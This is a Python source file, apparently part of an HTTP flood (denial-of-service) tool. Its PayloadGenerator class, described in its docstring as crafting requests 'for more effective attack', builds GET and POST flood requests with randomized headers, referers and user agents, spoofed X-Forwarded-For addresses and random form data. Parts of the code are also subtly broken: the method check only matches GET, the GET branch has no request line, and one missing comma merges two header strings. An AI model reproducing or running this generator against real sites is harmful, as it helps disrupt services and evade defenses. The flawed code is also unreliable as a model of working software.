import random
import string


class PayloadGenerator:
    """craft the requests optimized for more effective attack"""

    def __init__(self, methode: str, target: list[str]) -> None:
        self.meth = methode
        self.target = target

    def generate(self):
        if self.meth == ("GET" or "HEAD"):
            connection = "Connection: Keep-Alive\r\n"
            accept = self.acceptall() + "\r\n"
            referer = (
                "Referer: " + self.referer() + self.target[1] + self.target[3] + "\r\n"
            )
            connection += "Cache-Control: max-age=0\r\n"
            connection += "pragma: no-cache\r\n"
            connection += "X-Forwarded-For: " + self.ipspoof() + "\r\n"
            useragent = "User-Agent: " + self.useragent() + "\r\n"
            payload = referer + useragent + accept + connection + "\r\n\r\n"

        if self.meth == "POST":
            post_host = (
                "POST "
                + self.target[3]
                + " HTTP/1.1\r\nHost: "
                + self.target[1]
                + "\r\n"
            )
            content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
            refer = "Referer: http://" + self.target[1] + self.target[3] + "\r\n"
            user_agent = "User-Agent: " + self.useragent() + "\r\n"
            accept = self.acceptall() + "\r\n"
            connection = "Cache-Control: max-age=0\r\n"
            connection += "pragma: no-cache\r\n"
            connection += "X-Forwarded-For: " + self.ipspoof() + "\r\n"
            data = self.datagen()
            length = (
                "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
            )
            payload = (
                post_host
                + accept
                + connection
                + refer
                + content
                + user_agent
                + length
                + "\n"
                + data
                + "\r\n\r\n"
            )

        return payload

    @staticmethod
    def acceptall():
        accept = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
            "Accept-Encoding: gzip, deflate",
            "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
            "Accept: text/html, application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        ]
        accepted: str = random.choice(accept)
        return accepted

    @staticmethod
    def referer():
        referers = open("referers.txt", "r").readlines()
        refered: str = random.choice(referers)
        return refered

    @staticmethod
    def useragent():
        user_agents = open("user_agent.txt").readlines()
        user_agent: str = random.choice(user_agents)
        return user_agent

    @staticmethod
    def ipspoof():
        ip_parts = [random.randint(0, 255) for _ in range(4)]
        fake_ip = ".".join(map(str, ip_parts))
        return fake_ip

    @staticmethod
    def datagen():
        data = "".join(
            random.choice(string.ascii_letters + string.digits) for _ in range(50)
        )
        return data
